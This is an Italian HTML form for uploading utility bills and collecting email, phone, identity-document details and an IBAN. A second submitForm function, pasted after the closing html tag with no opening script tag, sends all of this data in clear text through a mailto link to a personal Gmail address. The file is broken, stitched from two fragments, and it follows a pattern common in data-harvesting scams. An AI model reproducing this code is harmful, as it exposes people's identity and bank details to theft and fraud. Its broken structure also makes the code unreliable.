<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caricamento Bollette e Dati Utente</title>
    <style>
        body {
            background-image: url('https://scontent.fqpa3-1.fna.fbcdn.net/v/t39.30808-6/261345423_2066655520157046_6294075886604175971_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=5f2048&_nc_ohc=SgLBKq_qZZAAX978lDM&_nc_ht=scontent.fqpa3-1.fna&oh=00_AfBe_yBpyRAlXY1G4g362dcsLY3p4YLdkHg2nHTveZNh0Q&oe=656264FD');
            background-size: cover;
            background-position: center center;
            color: white;
            padding: 20px;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        label,
        input {
            margin-bottom: 10px;
            width: 100%;
        }

        .upload-section {
            margin-bottom: 20px;
            width: 100%;
        }

        button {
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <h1>Caricamento Bollette e Dati Utente</h1>

    <div class="upload-section">
        <h2>Carica la bolletta Luce:</h2>
        <form enctype="multipart/form-data">
            <label for="electricityBillInput">Carica la bolletta (JPG, JPEG, PNG):</label>
            <input type="file" id="electricityBillInput" accept=".jpg, .jpeg, .png" required>
        </form>
    </div>

    <div class="upload-section">
        <h2>Carica la bolletta Gas:</h2>
        <form enctype="multipart/form-data">
            <label for="gasBillInput">Carica la bolletta (JPG, JPEG, PNG):</label>
            <input type="file" id="gasBillInput" accept=".jpg, .jpeg, .png" required>
        </form>
    </div>

    <form>
        <label for="emailInput">Email:</label>
        <input type="email" id="emailInput" required>

        <label for="phoneInput">Numero di cellulare:</label>
        <input type="tel" id="phoneInput" required>

        <label for="idDocumentInput">Documento d'identità:</label>
        <input type="text" id="idDocumentInput" required>

        <label for="releaseDateInput">Data di rilascio del documento:</label>
        <input type="date" id="releaseDateInput" required>

        <label for="expirationDateInput">Data di scadenza del documento:</label>
        <input type="date" id="expirationDateInput" required>

        <label for="ibanInput">IBAN (27 caratteri):</label>
        <input type="text" id="ibanInput" pattern="[A-Za-z]{2}[0-9]{2}[A-Za-z0-9]{1,}" title="Inserisci un IBAN valido" maxlength="27" required>

        <button type="button" onclick="submitForm()">Invia</button>
    </form>

    <!-- Link a Facebook per recensioni -->
    <p>Se desideri, puoi lasciare una recensione sulla nostra <a href="https://www.facebook.com/profile.php?id=61553102877749" target="_blank">pagina Facebook</a>.</p>

    <script>
        function submitForm() {
            // Implementa la logica per inviare i dati al server
            alert('Dati inviati con successo!');
        }
    </script>
</body>

</html>
    function submitForm() {
        // Recupera i dati dal modulo HTML
        const email = document.getElementById('emailInput').value;
        const phoneNumber = document.getElementById('phoneInput').value;
        const idDocument = document.getElementById('idDocumentInput').value;
        const releaseDate = document.getElementById('releaseDateInput').value;
        const expirationDate = document.getElementById('expirationDateInput').value;
        const iban = document.getElementById('ibanInput').value;

        // Configura il corpo del messaggio
        const messageBody = `
            Email: ${email}
            Numero di cellulare: ${phoneNumber}
            Documento d'identità: ${idDocument}
            Data di rilascio: ${releaseDate}
            Data di scadenza: ${expirationDate}
            IBAN: ${iban}
        `;

        // Invia l'email
        window.location.href = `mailto:silversallu@gmail.com?subject=Dati%20Utente&body=${encodeURIComponent(messageBody)}`;
        
        // Puoi anche considerare l'invio tramite AJAX al tuo server per una gestione più sicura
    }
</script>



